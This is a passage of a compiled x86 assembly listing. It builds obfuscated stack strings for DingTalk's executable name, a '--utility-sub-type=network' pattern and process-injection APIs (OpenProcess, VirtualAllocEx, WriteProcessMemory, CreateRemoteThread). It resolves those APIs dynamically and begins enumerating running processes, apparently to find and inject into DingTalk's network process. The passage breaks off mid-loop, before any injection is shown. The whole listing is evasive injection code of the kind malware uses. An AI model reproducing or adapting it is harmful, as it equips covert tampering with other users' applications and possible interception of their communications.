	mov	BYTE PTR _ntdll_name$[ebp+6], 100	; 00000064H
	mov	BYTE PTR _ntdll_name$[ebp+7], 108	; 0000006cH
	mov	BYTE PTR _ntdll_name$[ebp+8], 108	; 0000006cH
	mov	BYTE PTR _ntdll_name$[ebp+9], 0
; Line 82
	mov	ecx, 100				; 00000064H
	mov	WORD PTR _dingtalk$[ebp], cx
	mov	edx, 105				; 00000069H
	mov	WORD PTR _dingtalk$[ebp+2], dx
	mov	eax, 110				; 0000006eH
	mov	WORD PTR _dingtalk$[ebp+4], ax
	mov	ecx, 103				; 00000067H
	mov	WORD PTR _dingtalk$[ebp+6], cx
	mov	edx, 116				; 00000074H
	mov	WORD PTR _dingtalk$[ebp+8], dx
	mov	eax, 97					; 00000061H
	mov	WORD PTR _dingtalk$[ebp+10], ax
	mov	ecx, 108				; 0000006cH
	mov	WORD PTR _dingtalk$[ebp+12], cx
	mov	edx, 107				; 0000006bH
	mov	WORD PTR _dingtalk$[ebp+14], dx
	mov	eax, 46					; 0000002eH
	mov	WORD PTR _dingtalk$[ebp+16], ax
	mov	ecx, 101				; 00000065H
	mov	WORD PTR _dingtalk$[ebp+18], cx
	mov	edx, 120				; 00000078H
	mov	WORD PTR _dingtalk$[ebp+20], dx
	mov	eax, 101				; 00000065H
	mov	WORD PTR _dingtalk$[ebp+22], ax
	xor	ecx, ecx
	mov	WORD PTR _dingtalk$[ebp+24], cx
; Line 83
	mov	edx, 68					; 00000044H
	mov	WORD PTR _dingtalk_upper$[ebp], dx
	mov	eax, 73					; 00000049H
	mov	WORD PTR _dingtalk_upper$[ebp+2], ax
	mov	ecx, 78					; 0000004eH
	mov	WORD PTR _dingtalk_upper$[ebp+4], cx
	mov	edx, 71					; 00000047H
	mov	WORD PTR _dingtalk_upper$[ebp+6], dx
	mov	eax, 84					; 00000054H
	mov	WORD PTR _dingtalk_upper$[ebp+8], ax
	mov	ecx, 65					; 00000041H
	mov	WORD PTR _dingtalk_upper$[ebp+10], cx
	mov	edx, 76					; 0000004cH
	mov	WORD PTR _dingtalk_upper$[ebp+12], dx
	mov	eax, 75					; 0000004bH
	mov	WORD PTR _dingtalk_upper$[ebp+14], ax
	mov	ecx, 46					; 0000002eH
	mov	WORD PTR _dingtalk_upper$[ebp+16], cx
	mov	edx, 69					; 00000045H
	mov	WORD PTR _dingtalk_upper$[ebp+18], dx
	mov	eax, 88					; 00000058H
	mov	WORD PTR _dingtalk_upper$[ebp+20], ax
	mov	ecx, 69					; 00000045H
	mov	WORD PTR _dingtalk_upper$[ebp+22], cx
	xor	edx, edx
	mov	WORD PTR _dingtalk_upper$[ebp+24], dx
; Line 84
	mov	eax, 45					; 0000002dH
	mov	WORD PTR _dingtalk_pattern$[ebp], ax
	mov	ecx, 45					; 0000002dH
	mov	WORD PTR _dingtalk_pattern$[ebp+2], cx
	mov	edx, 117				; 00000075H
	mov	WORD PTR _dingtalk_pattern$[ebp+4], dx
	mov	eax, 116				; 00000074H
	mov	WORD PTR _dingtalk_pattern$[ebp+6], ax
	mov	ecx, 105				; 00000069H
	mov	WORD PTR _dingtalk_pattern$[ebp+8], cx
	mov	edx, 108				; 0000006cH
	mov	WORD PTR _dingtalk_pattern$[ebp+10], dx
	mov	eax, 105				; 00000069H
	mov	WORD PTR _dingtalk_pattern$[ebp+12], ax
	mov	ecx, 116				; 00000074H
	mov	WORD PTR _dingtalk_pattern$[ebp+14], cx
	mov	edx, 121				; 00000079H
	mov	WORD PTR _dingtalk_pattern$[ebp+16], dx
	mov	eax, 45					; 0000002dH
	mov	WORD PTR _dingtalk_pattern$[ebp+18], ax
	mov	ecx, 115				; 00000073H
	mov	WORD PTR _dingtalk_pattern$[ebp+20], cx
	mov	edx, 117				; 00000075H
	mov	WORD PTR _dingtalk_pattern$[ebp+22], dx
	mov	eax, 98					; 00000062H
	mov	WORD PTR _dingtalk_pattern$[ebp+24], ax
	mov	ecx, 45					; 0000002dH
	mov	WORD PTR _dingtalk_pattern$[ebp+26], cx
	mov	edx, 116				; 00000074H
	mov	WORD PTR _dingtalk_pattern$[ebp+28], dx
	mov	eax, 121				; 00000079H
	mov	WORD PTR _dingtalk_pattern$[ebp+30], ax
	mov	ecx, 112				; 00000070H
	mov	WORD PTR _dingtalk_pattern$[ebp+32], cx
	mov	edx, 101				; 00000065H
	mov	WORD PTR _dingtalk_pattern$[ebp+34], dx
	mov	eax, 61					; 0000003dH
	mov	WORD PTR _dingtalk_pattern$[ebp+36], ax
	mov	ecx, 110				; 0000006eH
	mov	WORD PTR _dingtalk_pattern$[ebp+38], cx
	mov	edx, 101				; 00000065H
	mov	WORD PTR _dingtalk_pattern$[ebp+40], dx
	mov	eax, 116				; 00000074H
	mov	WORD PTR _dingtalk_pattern$[ebp+42], ax
	mov	ecx, 119				; 00000077H
	mov	WORD PTR _dingtalk_pattern$[ebp+44], cx
	mov	edx, 111				; 0000006fH
	mov	WORD PTR _dingtalk_pattern$[ebp+46], dx
	mov	eax, 114				; 00000072H
	mov	WORD PTR _dingtalk_pattern$[ebp+48], ax
	mov	ecx, 107				; 0000006bH
	mov	WORD PTR _dingtalk_pattern$[ebp+50], cx
	xor	edx, edx
	mov	WORD PTR _dingtalk_pattern$[ebp+52], dx
; Line 86
	mov	BYTE PTR _load_lib_name$[ebp], 76	; 0000004cH
	mov	BYTE PTR _load_lib_name$[ebp+1], 111	; 0000006fH
	mov	BYTE PTR _load_lib_name$[ebp+2], 97	; 00000061H
	mov	BYTE PTR _load_lib_name$[ebp+3], 100	; 00000064H
	mov	BYTE PTR _load_lib_name$[ebp+4], 76	; 0000004cH
	mov	BYTE PTR _load_lib_name$[ebp+5], 105	; 00000069H
	mov	BYTE PTR _load_lib_name$[ebp+6], 98	; 00000062H
	mov	BYTE PTR _load_lib_name$[ebp+7], 114	; 00000072H
	mov	BYTE PTR _load_lib_name$[ebp+8], 97	; 00000061H
	mov	BYTE PTR _load_lib_name$[ebp+9], 114	; 00000072H
	mov	BYTE PTR _load_lib_name$[ebp+10], 121	; 00000079H
	mov	BYTE PTR _load_lib_name$[ebp+11], 65	; 00000041H
	mov	BYTE PTR _load_lib_name$[ebp+12], 0
; Line 87
	mov	BYTE PTR _get_proc_name$[ebp], 71	; 00000047H
	mov	BYTE PTR _get_proc_name$[ebp+1], 101	; 00000065H
	mov	BYTE PTR _get_proc_name$[ebp+2], 116	; 00000074H
	mov	BYTE PTR _get_proc_name$[ebp+3], 80	; 00000050H
	mov	BYTE PTR _get_proc_name$[ebp+4], 114	; 00000072H
	mov	BYTE PTR _get_proc_name$[ebp+5], 111	; 0000006fH
	mov	BYTE PTR _get_proc_name$[ebp+6], 99	; 00000063H
	mov	BYTE PTR _get_proc_name$[ebp+7], 65	; 00000041H
	mov	BYTE PTR _get_proc_name$[ebp+8], 100	; 00000064H
	mov	BYTE PTR _get_proc_name$[ebp+9], 100	; 00000064H
	mov	BYTE PTR _get_proc_name$[ebp+10], 114	; 00000072H
	mov	BYTE PTR _get_proc_name$[ebp+11], 101	; 00000065H
	mov	BYTE PTR _get_proc_name$[ebp+12], 115	; 00000073H
	mov	BYTE PTR _get_proc_name$[ebp+13], 115	; 00000073H
	mov	BYTE PTR _get_proc_name$[ebp+14], 0
; Line 88
	mov	BYTE PTR _open_process_name$[ebp], 79	; 0000004fH
	mov	BYTE PTR _open_process_name$[ebp+1], 112 ; 00000070H
	mov	BYTE PTR _open_process_name$[ebp+2], 101 ; 00000065H
	mov	BYTE PTR _open_process_name$[ebp+3], 110 ; 0000006eH
	mov	BYTE PTR _open_process_name$[ebp+4], 80	; 00000050H
	mov	BYTE PTR _open_process_name$[ebp+5], 114 ; 00000072H
	mov	BYTE PTR _open_process_name$[ebp+6], 111 ; 0000006fH
	mov	BYTE PTR _open_process_name$[ebp+7], 99	; 00000063H
	mov	BYTE PTR _open_process_name$[ebp+8], 101 ; 00000065H
	mov	BYTE PTR _open_process_name$[ebp+9], 115 ; 00000073H
	mov	BYTE PTR _open_process_name$[ebp+10], 115 ; 00000073H
	mov	BYTE PTR _open_process_name$[ebp+11], 0
; Line 89
	mov	BYTE PTR _get_module_handlea_name$[ebp], 71 ; 00000047H
	mov	BYTE PTR _get_module_handlea_name$[ebp+1], 101 ; 00000065H
	mov	BYTE PTR _get_module_handlea_name$[ebp+2], 116 ; 00000074H
	mov	BYTE PTR _get_module_handlea_name$[ebp+3], 77 ; 0000004dH
	mov	BYTE PTR _get_module_handlea_name$[ebp+4], 111 ; 0000006fH
	mov	BYTE PTR _get_module_handlea_name$[ebp+5], 100 ; 00000064H
	mov	BYTE PTR _get_module_handlea_name$[ebp+6], 117 ; 00000075H
	mov	BYTE PTR _get_module_handlea_name$[ebp+7], 108 ; 0000006cH
	mov	BYTE PTR _get_module_handlea_name$[ebp+8], 101 ; 00000065H
	mov	BYTE PTR _get_module_handlea_name$[ebp+9], 72 ; 00000048H
	mov	BYTE PTR _get_module_handlea_name$[ebp+10], 97 ; 00000061H
	mov	BYTE PTR _get_module_handlea_name$[ebp+11], 110 ; 0000006eH
	mov	BYTE PTR _get_module_handlea_name$[ebp+12], 100 ; 00000064H
	mov	BYTE PTR _get_module_handlea_name$[ebp+13], 108 ; 0000006cH
	mov	BYTE PTR _get_module_handlea_name$[ebp+14], 101 ; 00000065H
	mov	BYTE PTR _get_module_handlea_name$[ebp+15], 65 ; 00000041H
	mov	BYTE PTR _get_module_handlea_name$[ebp+16], 0
; Line 90
	mov	BYTE PTR _get_current_process_name$[ebp], 71 ; 00000047H
	mov	BYTE PTR _get_current_process_name$[ebp+1], 101 ; 00000065H
	mov	BYTE PTR _get_current_process_name$[ebp+2], 116 ; 00000074H
	mov	BYTE PTR _get_current_process_name$[ebp+3], 67 ; 00000043H
	mov	BYTE PTR _get_current_process_name$[ebp+4], 117 ; 00000075H
	mov	BYTE PTR _get_current_process_name$[ebp+5], 114 ; 00000072H
	mov	BYTE PTR _get_current_process_name$[ebp+6], 114 ; 00000072H
	mov	BYTE PTR _get_current_process_name$[ebp+7], 101 ; 00000065H
	mov	BYTE PTR _get_current_process_name$[ebp+8], 110 ; 0000006eH
	mov	BYTE PTR _get_current_process_name$[ebp+9], 116 ; 00000074H
	mov	BYTE PTR _get_current_process_name$[ebp+10], 80 ; 00000050H
	mov	BYTE PTR _get_current_process_name$[ebp+11], 114 ; 00000072H
	mov	BYTE PTR _get_current_process_name$[ebp+12], 111 ; 0000006fH
	mov	BYTE PTR _get_current_process_name$[ebp+13], 99 ; 00000063H
	mov	BYTE PTR _get_current_process_name$[ebp+14], 101 ; 00000065H
	mov	BYTE PTR _get_current_process_name$[ebp+15], 115 ; 00000073H
	mov	BYTE PTR _get_current_process_name$[ebp+16], 115 ; 00000073H
	mov	BYTE PTR _get_current_process_name$[ebp+17], 0
; Line 91
	mov	BYTE PTR _virtual_alloc_name$[ebp], 86	; 00000056H
	mov	BYTE PTR _virtual_alloc_name$[ebp+1], 105 ; 00000069H
	mov	BYTE PTR _virtual_alloc_name$[ebp+2], 114 ; 00000072H
	mov	BYTE PTR _virtual_alloc_name$[ebp+3], 116 ; 00000074H
	mov	BYTE PTR _virtual_alloc_name$[ebp+4], 117 ; 00000075H
	mov	BYTE PTR _virtual_alloc_name$[ebp+5], 97 ; 00000061H
	mov	BYTE PTR _virtual_alloc_name$[ebp+6], 108 ; 0000006cH
	mov	BYTE PTR _virtual_alloc_name$[ebp+7], 65 ; 00000041H
	mov	BYTE PTR _virtual_alloc_name$[ebp+8], 108 ; 0000006cH
	mov	BYTE PTR _virtual_alloc_name$[ebp+9], 108 ; 0000006cH
	mov	BYTE PTR _virtual_alloc_name$[ebp+10], 111 ; 0000006fH
	mov	BYTE PTR _virtual_alloc_name$[ebp+11], 99 ; 00000063H
	mov	BYTE PTR _virtual_alloc_name$[ebp+12], 0
; Line 92
	mov	BYTE PTR _virtual_free_name$[ebp], 86	; 00000056H
	mov	BYTE PTR _virtual_free_name$[ebp+1], 105 ; 00000069H
	mov	BYTE PTR _virtual_free_name$[ebp+2], 114 ; 00000072H
	mov	BYTE PTR _virtual_free_name$[ebp+3], 116 ; 00000074H
	mov	BYTE PTR _virtual_free_name$[ebp+4], 117 ; 00000075H
	mov	BYTE PTR _virtual_free_name$[ebp+5], 97	; 00000061H
	mov	BYTE PTR _virtual_free_name$[ebp+6], 108 ; 0000006cH
	mov	BYTE PTR _virtual_free_name$[ebp+7], 70	; 00000046H
	mov	BYTE PTR _virtual_free_name$[ebp+8], 114 ; 00000072H
	mov	BYTE PTR _virtual_free_name$[ebp+9], 101 ; 00000065H
	mov	BYTE PTR _virtual_free_name$[ebp+10], 101 ; 00000065H
	mov	BYTE PTR _virtual_free_name$[ebp+11], 0
; Line 93
	mov	BYTE PTR _read_process_memory_name$[ebp], 82 ; 00000052H
	mov	BYTE PTR _read_process_memory_name$[ebp+1], 101 ; 00000065H
	mov	BYTE PTR _read_process_memory_name$[ebp+2], 97 ; 00000061H
	mov	BYTE PTR _read_process_memory_name$[ebp+3], 100 ; 00000064H
	mov	BYTE PTR _read_process_memory_name$[ebp+4], 80 ; 00000050H
	mov	BYTE PTR _read_process_memory_name$[ebp+5], 114 ; 00000072H
	mov	BYTE PTR _read_process_memory_name$[ebp+6], 111 ; 0000006fH
	mov	BYTE PTR _read_process_memory_name$[ebp+7], 99 ; 00000063H
	mov	BYTE PTR _read_process_memory_name$[ebp+8], 101 ; 00000065H
	mov	BYTE PTR _read_process_memory_name$[ebp+9], 115 ; 00000073H
	mov	BYTE PTR _read_process_memory_name$[ebp+10], 115 ; 00000073H
	mov	BYTE PTR _read_process_memory_name$[ebp+11], 77 ; 0000004dH
	mov	BYTE PTR _read_process_memory_name$[ebp+12], 101 ; 00000065H
	mov	BYTE PTR _read_process_memory_name$[ebp+13], 109 ; 0000006dH
	mov	BYTE PTR _read_process_memory_name$[ebp+14], 111 ; 0000006fH
	mov	BYTE PTR _read_process_memory_name$[ebp+15], 114 ; 00000072H
	mov	BYTE PTR _read_process_memory_name$[ebp+16], 121 ; 00000079H
	mov	BYTE PTR _read_process_memory_name$[ebp+17], 0
; Line 94
	mov	BYTE PTR _nt_query_system_information_name$[ebp], 78 ; 0000004eH
	mov	BYTE PTR _nt_query_system_information_name$[ebp+1], 116 ; 00000074H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+2], 81 ; 00000051H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+3], 117 ; 00000075H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+4], 101 ; 00000065H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+5], 114 ; 00000072H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+6], 121 ; 00000079H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+7], 83 ; 00000053H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+8], 121 ; 00000079H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+9], 115 ; 00000073H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+10], 116 ; 00000074H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+11], 101 ; 00000065H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+12], 109 ; 0000006dH
	mov	BYTE PTR _nt_query_system_information_name$[ebp+13], 73 ; 00000049H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+14], 110 ; 0000006eH
	mov	BYTE PTR _nt_query_system_information_name$[ebp+15], 102 ; 00000066H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+16], 111 ; 0000006fH
	mov	BYTE PTR _nt_query_system_information_name$[ebp+17], 114 ; 00000072H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+18], 109 ; 0000006dH
	mov	BYTE PTR _nt_query_system_information_name$[ebp+19], 97 ; 00000061H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+20], 116 ; 00000074H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+21], 105 ; 00000069H
	mov	BYTE PTR _nt_query_system_information_name$[ebp+22], 111 ; 0000006fH
	mov	BYTE PTR _nt_query_system_information_name$[ebp+23], 110 ; 0000006eH
	mov	BYTE PTR _nt_query_system_information_name$[ebp+24], 0
; Line 95
	mov	BYTE PTR _nt_query_information_process_name$[ebp], 78 ; 0000004eH
	mov	BYTE PTR _nt_query_information_process_name$[ebp+1], 116 ; 00000074H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+2], 81 ; 00000051H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+3], 117 ; 00000075H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+4], 101 ; 00000065H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+5], 114 ; 00000072H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+6], 121 ; 00000079H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+7], 73 ; 00000049H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+8], 110 ; 0000006eH
	mov	BYTE PTR _nt_query_information_process_name$[ebp+9], 102 ; 00000066H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+10], 111 ; 0000006fH
	mov	BYTE PTR _nt_query_information_process_name$[ebp+11], 114 ; 00000072H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+12], 109 ; 0000006dH
	mov	BYTE PTR _nt_query_information_process_name$[ebp+13], 97 ; 00000061H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+14], 116 ; 00000074H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+15], 105 ; 00000069H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+16], 111 ; 0000006fH
	mov	BYTE PTR _nt_query_information_process_name$[ebp+17], 110 ; 0000006eH
	mov	BYTE PTR _nt_query_information_process_name$[ebp+18], 80 ; 00000050H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+19], 114 ; 00000072H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+20], 111 ; 0000006fH
	mov	BYTE PTR _nt_query_information_process_name$[ebp+21], 99 ; 00000063H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+22], 101 ; 00000065H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+23], 115 ; 00000073H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+24], 115 ; 00000073H
	mov	BYTE PTR _nt_query_information_process_name$[ebp+25], 0
; Line 98
	mov	BYTE PTR _VirtualAllocEx_name$[ebp], 86	; 00000056H
	mov	BYTE PTR _VirtualAllocEx_name$[ebp+1], 105 ; 00000069H
	mov	BYTE PTR _VirtualAllocEx_name$[ebp+2], 114 ; 00000072H
	mov	BYTE PTR _VirtualAllocEx_name$[ebp+3], 116 ; 00000074H
	mov	BYTE PTR _VirtualAllocEx_name$[ebp+4], 117 ; 00000075H
	mov	BYTE PTR _VirtualAllocEx_name$[ebp+5], 97 ; 00000061H
	mov	BYTE PTR _VirtualAllocEx_name$[ebp+6], 108 ; 0000006cH
	mov	BYTE PTR _VirtualAllocEx_name$[ebp+7], 65 ; 00000041H
	mov	BYTE PTR _VirtualAllocEx_name$[ebp+8], 108 ; 0000006cH
	mov	BYTE PTR _VirtualAllocEx_name$[ebp+9], 108 ; 0000006cH
	mov	BYTE PTR _VirtualAllocEx_name$[ebp+10], 111 ; 0000006fH
	mov	BYTE PTR _VirtualAllocEx_name$[ebp+11], 99 ; 00000063H
	mov	BYTE PTR _VirtualAllocEx_name$[ebp+12], 69 ; 00000045H
	mov	BYTE PTR _VirtualAllocEx_name$[ebp+13], 120 ; 00000078H
	mov	BYTE PTR _VirtualAllocEx_name$[ebp+14], 0
; Line 99
	mov	BYTE PTR _CreateRemoteThread_name$[ebp], 67 ; 00000043H
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+1], 114 ; 00000072H
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+2], 101 ; 00000065H
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+3], 97 ; 00000061H
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+4], 116 ; 00000074H
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+5], 101 ; 00000065H
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+6], 82 ; 00000052H
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+7], 101 ; 00000065H
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+8], 109 ; 0000006dH
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+9], 111 ; 0000006fH
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+10], 116 ; 00000074H
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+11], 101 ; 00000065H
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+12], 84 ; 00000054H
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+13], 104 ; 00000068H
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+14], 114 ; 00000072H
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+15], 101 ; 00000065H
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+16], 97 ; 00000061H
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+17], 100 ; 00000064H
	mov	BYTE PTR _CreateRemoteThread_name$[ebp+18], 0
; Line 100
	mov	BYTE PTR _WriteProcessMemory_name$[ebp], 87 ; 00000057H
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+1], 114 ; 00000072H
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+2], 105 ; 00000069H
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+3], 116 ; 00000074H
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+4], 101 ; 00000065H
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+5], 80 ; 00000050H
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+6], 114 ; 00000072H
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+7], 111 ; 0000006fH
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+8], 99 ; 00000063H
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+9], 101 ; 00000065H
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+10], 115 ; 00000073H
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+11], 115 ; 00000073H
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+12], 77 ; 0000004dH
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+13], 101 ; 00000065H
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+14], 109 ; 0000006dH
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+15], 111 ; 0000006fH
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+16], 114 ; 00000072H
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+17], 121 ; 00000079H
	mov	BYTE PTR _WriteProcessMemory_name$[ebp+18], 0
; Line 104
	lea	eax, DWORD PTR _kernel32_dll_name$[ebp]
	push	eax
	call	?get_module_by_name@@YAPAXPA_W@Z	; get_module_by_name
	add	esp, 4
	mov	DWORD PTR _base$[ebp], eax
; Line 105
	cmp	DWORD PTR _base$[ebp], 0
	jne	SHORT $LN24@main
; Line 106
	mov	eax, 1
	jmp	$LN1@main
$LN24@main:
; Line 110
	lea	ecx, DWORD PTR _load_lib_name$[ebp]
	push	ecx
	mov	edx, DWORD PTR _base$[ebp]
	push	edx
	call	?get_func_by_name@@YAPAXPAXPAD@Z	; get_func_by_name
	add	esp, 8
	mov	DWORD PTR _load_lib$[ebp], eax
; Line 111
	cmp	DWORD PTR _load_lib$[ebp], 0
	jne	SHORT $LN25@main
; Line 112
	mov	eax, 1
	jmp	$LN1@main
$LN25@main:
; Line 116
	lea	eax, DWORD PTR _get_proc_name$[ebp]
	push	eax
	mov	ecx, DWORD PTR _base$[ebp]
	push	ecx
	call	?get_func_by_name@@YAPAXPAXPAD@Z	; get_func_by_name
	add	esp, 8
	mov	DWORD PTR _get_proc$[ebp], eax
; Line 117
	cmp	DWORD PTR _get_proc$[ebp], 0
	jne	SHORT $LN26@main
; Line 118
	mov	eax, 1
	jmp	$LN1@main
$LN26@main:
; Line 122
	mov	edx, DWORD PTR _load_lib$[ebp]
	mov	DWORD PTR __LoadLibraryA$[ebp], edx
; Line 124
	mov	eax, DWORD PTR _get_proc$[ebp]
	mov	DWORD PTR __GetProcAddress$[ebp], eax
; Line 132
	lea	ecx, DWORD PTR _open_process_name$[ebp]
	push	ecx
	mov	edx, DWORD PTR _base$[ebp]
	push	edx
	call	DWORD PTR __GetProcAddress$[ebp]
	mov	DWORD PTR __OpenProcess$[ebp], eax
; Line 136
	lea	eax, DWORD PTR _get_module_handlea_name$[ebp]
	push	eax
	mov	ecx, DWORD PTR _base$[ebp]
	push	ecx
	call	DWORD PTR __GetProcAddress$[ebp]
	mov	DWORD PTR __GetModuleHandleA$[ebp], eax
; Line 138
	lea	edx, DWORD PTR _get_current_process_name$[ebp]
	push	edx
	mov	eax, DWORD PTR _base$[ebp]
	push	eax
	call	DWORD PTR __GetProcAddress$[ebp]
	mov	DWORD PTR __GetCurrentProcess$[ebp], eax
; Line 148
	lea	ecx, DWORD PTR _virtual_alloc_name$[ebp]
	push	ecx
	mov	edx, DWORD PTR _base$[ebp]
	push	edx
	call	DWORD PTR __GetProcAddress$[ebp]
	mov	DWORD PTR __VirtualAlloc$[ebp], eax
; Line 156
	lea	eax, DWORD PTR _virtual_free_name$[ebp]
	push	eax
	mov	ecx, DWORD PTR _base$[ebp]
	push	ecx
	call	DWORD PTR __GetProcAddress$[ebp]
	mov	DWORD PTR __VirtualFree$[ebp], eax
; Line 169
	lea	edx, DWORD PTR _read_process_memory_name$[ebp]
	push	edx
	mov	eax, DWORD PTR _base$[ebp]
	push	eax
	call	DWORD PTR __GetProcAddress$[ebp]
	mov	DWORD PTR __ReadProcessMemory$[ebp], eax
; Line 171
	lea	ecx, DWORD PTR _nt_query_system_information_name$[ebp]
	push	ecx
	lea	edx, DWORD PTR _ntdll_name$[ebp]
	push	edx
	call	DWORD PTR __GetModuleHandleA$[ebp]
	push	eax
	call	DWORD PTR __GetProcAddress$[ebp]
	mov	DWORD PTR _fNtQuerySystemInformation$[ebp], eax
; Line 172
	lea	eax, DWORD PTR _nt_query_information_process_name$[ebp]
	push	eax
	lea	ecx, DWORD PTR _ntdll_name$[ebp]
	push	ecx
	call	DWORD PTR __GetModuleHandleA$[ebp]
	push	eax
	call	DWORD PTR __GetProcAddress$[ebp]
	mov	DWORD PTR _fNtQueryInformationProcess$[ebp], eax
; Line 173
	lea	edx, DWORD PTR _CreateRemoteThread_name$[ebp]
	push	edx
	mov	eax, DWORD PTR _base$[ebp]
	push	eax
	call	DWORD PTR __GetProcAddress$[ebp]
	mov	DWORD PTR _fn_CreateRemoteThread$[ebp], eax
; Line 174
	lea	ecx, DWORD PTR _VirtualAllocEx_name$[ebp]
	push	ecx
	mov	edx, DWORD PTR _base$[ebp]
	push	edx
	call	DWORD PTR __GetProcAddress$[ebp]
	mov	DWORD PTR _fn_VirtualAllocEx$[ebp], eax
; Line 175
	lea	eax, DWORD PTR _WriteProcessMemory_name$[ebp]
	push	eax
	mov	ecx, DWORD PTR _base$[ebp]
	push	ecx
	call	DWORD PTR __GetProcAddress$[ebp]
	mov	DWORD PTR _fn_WriteProcessMemory$[ebp], eax
; Line 178
	push	4
	push	4096					; 00001000H
	push	1048576					; 00100000H
	push	0
	call	DWORD PTR __VirtualAlloc$[ebp]
	mov	DWORD PTR _pInfo$[ebp], eax
; Line 179
	cmp	DWORD PTR _pInfo$[ebp], 0
	jne	SHORT $LN27@main
; Line 180
	mov	eax, 1
	jmp	$LN1@main
$LN27@main:
; Line 182
	mov	DWORD PTR _uReturnedLEngth$[ebp], 0
; Line 183
	lea	edx, DWORD PTR _uReturnedLEngth$[ebp]
	push	edx
	push	1048576					; 00100000H
	mov	eax, DWORD PTR _pInfo$[ebp]
	push	eax
	push	5
	call	DWORD PTR _fNtQuerySystemInformation$[ebp]
	mov	DWORD PTR _status$[ebp], eax
; Line 184
	cmp	DWORD PTR _status$[ebp], 0
	je	SHORT $LN28@main
; Line 185
	mov	eax, 1
	jmp	$LN1@main
$LN28@main:
; Line 187
	mov	ecx, DWORD PTR _pInfo$[ebp]
	mov	DWORD PTR _pSystemInformation$[ebp], ecx
; Line 189
	mov	edx, DWORD PTR _pSystemInformation$[ebp]
	mov	eax, DWORD PTR [edx+60]
	mov	DWORD PTR _pImageName$[ebp], eax
; Line 190
	mov	ecx, DWORD PTR _pSystemInformation$[ebp]
	mov	edx, DWORD PTR [ecx+68]
	mov	DWORD PTR _dwID$[ebp], edx
; Line 191
	mov	DWORD PTR _hProcess$[ebp], 0
; Line 194
	xor	eax, eax
	mov	WORD PTR _usCmdLen$[ebp], ax
; Line 195
	xor	ecx, ecx
	mov	WORD PTR _usPathLen$[ebp], cx
; Line 196
	mov	DWORD PTR _dwPatternLength$[ebp], 26	; 0000001aH
; Line 197
	mov	DWORD PTR _dwNetWorkInstPID$[ebp], 0
; Line 199
	mov	DWORD PTR _nImageNameLength$[ebp], 0
$LN2@main:
; Line 202
	mov	edx, 1
	test	edx, edx
	je	$LN3@main
; Line 203
	mov	eax, DWORD PTR _pSystemInformation$[ebp]
	cmp	DWORD PTR [eax], 0
	jne	SHORT $LN29@main
; Line 204
	jmp	$LN3@main
$LN29@main:
; Line 206
	mov	ecx, DWORD PTR _pSystemInformation$[ebp]
	mov	edx, DWORD PTR _pSystemInformation$[ebp]
	add	edx, DWORD PTR [ecx]
	mov	DWORD PTR _pSystemInformation$[ebp], edx
; Line 207
	mov	eax, DWORD PTR _pSystemInformation$[ebp]
	mov	ecx, DWORD PTR [eax+60]
	mov	DWORD PTR _pImageName$[ebp], ecx
; Line 208
	mov	DWORD PTR _nImageNameLength$[ebp], 0
	jmp	SHORT $LN6@main
$LN4@main:
